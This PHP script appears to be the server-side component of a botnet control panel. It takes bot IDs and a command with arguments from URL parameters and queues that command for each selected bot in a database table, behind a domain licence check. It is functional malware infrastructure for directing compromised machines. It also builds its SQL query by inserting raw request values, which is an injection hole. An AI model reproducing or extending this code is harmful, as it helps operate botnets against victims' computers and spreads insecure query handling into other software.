<?php
  if (file_exists("reg.php")) {
    include("reg.php");
	if ($validDomain == "false") {
	  die("Unauthorized Domain: Please contact support.");
	}
  } else {
    die("Missing Files: Please contact support.");
  }
  
include("functions.php");

if($_GET['uid'] == ""){
	echo "Please select at least 1 bot.";
	die();
}
if(!isset($_GET['command'])){
	echo "You shouldn't be getting this error.";
	die();
}

$UID = explode(",", $_GET['uid']);
$Command = $_GET['command'];
$Arg1 = $_GET['arg1'];
$Arg2 = $_GET['arg2'];

if($Arg1 == "undefined") {
  $Arg1 = "";
}
if($Arg2 == "undefined") {
  $Arg2 = "";
}

foreach ($UID as $currentUID) {
  $statement = $connect->prepare("INSERT INTO `commands` (`uid`, `command`, `arg1`, `arg2`) VALUES ('$currentUID', '$Command', '$Arg1', '$Arg2')");
  $statement->execute();
}

echo "Success";
?>